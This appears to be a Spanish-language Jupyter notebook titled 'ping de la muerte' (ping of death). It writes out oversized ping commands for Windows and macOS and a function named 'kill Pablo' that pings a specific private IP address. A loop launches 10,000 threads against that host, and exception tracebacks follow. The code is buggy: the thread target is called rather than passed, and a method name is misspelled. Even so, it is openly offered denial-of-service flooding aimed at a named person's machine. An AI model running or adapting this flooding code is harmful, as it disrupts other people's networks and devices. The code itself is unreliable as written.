# %% [markdown]
# ## FourthPROGRAM

# %% [markdown]
# ## -- ping de la muerte --

# %% [markdown]
# ### ifconfig _MACOS_ ipconfig _WIN_

# %%
# !ipconfig

# %%
import threading, os

# %%
from IPython import display
display.Image("Captura.PNG")

# %% [markdown]
# 1. ping <dirección ip> -l 65500 -w 1 -n 1 WIN
# 2. ping <dirección ip> -s 65500 -t 1 -n 1 MACos

# %%
def matar_a_pablo():
    os.popen("ping 10.34.83.253 -l 65500 -w 1 -n 1") 
    print(threading.current_Thread())

# %%
res_ = os.popen("ping 10.34.83.253 -l 65500 -w 1 -n 1")

# %%
for i in range(10000):
    threading.Thread(target=matar_a_pablo()).start()
# Out:
# Exception in thread Thread-7:
# Traceback (most recent call last):
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 932, in _bootstrap_inner
# Exception in thread Thread-8:
# Traceback (most recent call last):
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 932, in _bootstrap_inner
# Exception in thread Thread-9:
# Traceback (most recent call last):
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 932, in _bootstrap_inner
#     self.run()
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 870, in run
#     self.run()
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 870, in run
# Exception in thread Thread-10:
# Traceback (most recent call last):
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 932, in _bootstrap_inner
#     Exception in thread Thread-11:
# Traceback (most recent call last):
#   File "C:\Users\farre\anaconda3\lib\threading.py", line 932, in _bootstrap_inner
# self.run()
# ...
